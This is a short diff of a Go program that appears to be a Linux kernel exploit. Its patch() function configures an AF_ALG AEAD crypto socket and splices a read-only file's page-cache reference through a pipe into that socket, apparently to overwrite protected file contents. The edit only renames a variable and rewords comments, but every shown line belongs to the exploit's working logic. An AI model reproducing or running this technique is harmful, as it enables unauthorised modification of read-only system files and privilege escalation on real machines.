@@ -77,14 +77,14 @@ func patch(f *os.File, t int, cData []byte) {
     defer unix.Close(uFd)
 
     //5) Build control messages
-    var oob []byte
-    oob = append(oob, buildCmsg(SOL_ALG, ALG_SET_OP, []byte{0, 0, 0, 0})...)                        // ALG_SET_OP (Decrypt)
-    oob = append(oob, buildCmsg(SOL_ALG, ALG_SET_IV, append([]byte{0x10}, make([]byte, 19)...))...) // ALG_SET_IV (20 bytes)
-    oob = append(oob, buildCmsg(SOL_ALG, ALG_SET_AEAD_ASSOCLEN, []byte{8, 0, 0, 0})...)             // ALG_SET_AEAD_ASSOCLEN
+    var init []byte
+    init = append(init, buildCmsg(SOL_ALG, ALG_SET_OP, []byte{0, 0, 0, 0})...)                        // ALG_SET_OP (Decrypt)
+    init = append(init, buildCmsg(SOL_ALG, ALG_SET_IV, append([]byte{0x10}, make([]byte, 19)...))...) // ALG_SET_IV (20 bytes)
+    init = append(init, buildCmsg(SOL_ALG, ALG_SET_AEAD_ASSOCLEN, []byte{8, 0, 0, 0})...)             // ALG_SET_AEAD_ASSOCLEN
 
-    //6) Send payload out-of-band configuring encryption state
+    //6) Configure encryption state, send payload prefix padding
     msgData := append([]byte("AAAA"), cData...)
-    err = unix.Sendmsg(uFd, msgData, oob, nil, unix.MSG_MORE)
+    err = unix.Sendmsg(uFd, msgData, init, nil, unix.MSG_MORE)
     if err != nil {
         log.Fatalf("Sendmsg failed: %v", err)
     }
@@ -97,7 +97,7 @@ func patch(f *os.File, t int, cData []byte) {
     defer unix.Close(p[0])
     defer unix.Close(p[1])
 
-    //8) Splice magic (moves read-only page cache ref into the pipe -> then to the crypto socket)
+    //8) Splice (moves read-only page cache ref into the pipe, then to the crypto socket)
     o := t + 4
     offset := int64(0)
 
